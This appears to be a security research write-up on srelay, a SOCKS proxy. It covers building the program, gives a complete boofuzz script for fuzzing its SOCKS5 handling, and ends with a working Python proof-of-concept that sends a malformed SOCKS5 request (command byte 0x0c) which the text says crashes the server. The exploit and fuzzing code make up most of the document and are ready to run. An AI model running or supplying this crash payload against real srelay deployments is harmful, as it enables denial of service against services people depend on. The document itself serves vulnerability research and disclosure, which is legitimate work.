## srelay Denial of Service Exploitation

### Objective
The goal is to analyze srelay for vulnerabilities that could lead to a Denial of Service (DoS). This effort aims to improve srelay's security by identifying and addressing potential weaknesses.

### Downloading and Compiling srelay
**Download**: Obtain the srelay source code from the official repository.
Use this link to download srelay: https://sourceforge.net/projects/socks-relay/files/socks-relay/srelay-0.4.8/srelay-0.4.8p3.tar.gz/download

**Compilation**: Use the following commands to compile the source code on a Linux environment:

```bash

sudo apt-get install build-essential # Install dependencies

tar -xvzf srelay-0.4.8p3.tar.gz # Unpack the source code archive
cd srelay-0.4.8p3
./configure
make
file srelay        
srelay: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dc63d8f21cbcc4f8fcc299142d8e01534734083a, for GNU/Linux 3.2.0, not stripped
```
**Execution**: To verify successful compilation and operation, run srelay with:
```bash
./srelay -f 
```
Ensure it is listening for connections to confirm operational status.


### Fuzzing with boofuzz
Developed a boofuzz script to target the SOCKS protocol handling in srelay. The script performs the following actions:

Steps to install boofuzz
https://boofuzz.readthedocs.io/en/stable/user/install.html

**Setup**: Initializes a boofuzz session and defines the target IP and port.

**Fuzzing Logic:** Sends a variety of malformed inputs to probe for vulnerabilities.

**Monitoring**: Leverages boofuzz's monitoring capabilities to detect crashes.

### Vulnerability Discovery
```bash
#!/usr/bin/env python3

import boofuzz
from boofuzz import *

def main():
    # Initialize a session for fuzzing.
    # Targeting a SOCKS proxy at 127.0.0.1 on port 1080.
    session = boofuzz.Session(
        target=boofuzz.Target(
            connection=boofuzz.SocketConnection("127.0.0.1", 1080, proto='tcp')
        ),
    )

    # Define the structure for a SOCKS5 handshake.
    s_initialize("SOCKS5-Handshake")
    s_byte(0x05, name="Version")  # SOCKS version (5)
    s_size("AuthMethods", length=1, fuzzable=True)  # Number of authentication methods supported
    s_block_start("AuthMethods")
    s_byte(0x00, name="AuthMethod")  # No authentication
    s_block_end()

    # Define the structure for a SOCKS5 request.
    s_initialize("SOCKS5-Request")
    s_byte(0x05, name="Version")  # SOCKS version (5)
    s_byte(0x01, name="Command")  # Command code: 1 for CONNECT
    s_byte(0x00, name="Reserved")  # Reserved byte, must be 0x00
    s_byte(0x01, name="AddressType")  # Address type: 1 for IPv4
    s_static(b"\x7f\x00\x00\x01", name="DestinationAddress")  # Destination address (127.0.0.1)
    s_word(0x0050, name="DestinationPort", endian=">")  # Destination port (80)

    # Connect the defined structures to the session.
    session.connect(s_get("SOCKS5-Handshake"))
    session.connect(s_get("SOCKS5-Handshake"), s_get("SOCKS5-Request"))

    # Start the fuzzing process.
    session.fuzz()

if __name__ == "__main__":
    main()

```
### Proof of Concept (PoC) for Denial of Service

```bash
#!/usr/bin/env python3

import socket
import struct
# SOCKS5 handshake bytes
handshake = b"\x05\x01\x00"
# SOCKS5 request bytes to connect to 127.0.0.1:80
request = b"\x05\x0c\x00\x01" + socket.inet_aton("127.0.0.1") + struct.pack(">H", 80)
# Function to send data and print the transmitted bytes
def send_data(sock, data):
    print(f"Sending {len(data)} bytes...")
    sock.sendall(data)
    print(f"Transmitted {len(data)} bytes: {data}")
# Function to receive data and print the received bytes
def receive_data(sock):
    response = sock.recv(4096)
    print(f"Received: {response}")
    return response
def main():
    # Connect to the target SOCKS proxy
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        proxy_address = ('127.0.0.1', 1080)
        print(f"Opening target connection ({proxy_address[0]}:{proxy_address[1]})...")
        sock.connect(proxy_address)
        print("Connection opened.")
        # Perform the SOCKS5 handshake
        print("Transmit Prep Node 'SOCKS5-Handshake'")
        send_data(sock, handshake)
        print("Info: Receiving...")
        receive_data(sock)
        # Send the SOCKS5 request
        print("Fuzzing Node 'SOCKS5-Request'")
        send_data(sock, request)
        # After sending, you might want to receive the response
        # from the SOCKS5 server for the request, or handle any
        # additional protocol steps depending on your needs.
        print("Closing target connection...")
        # The socket is closed automatically when the with-block ends
if __name__ == "__main__":
    main()
```

![img.png](img.png)

The PoC script demonstrates the vulnerability by sending the identified malicious input causing the crash.
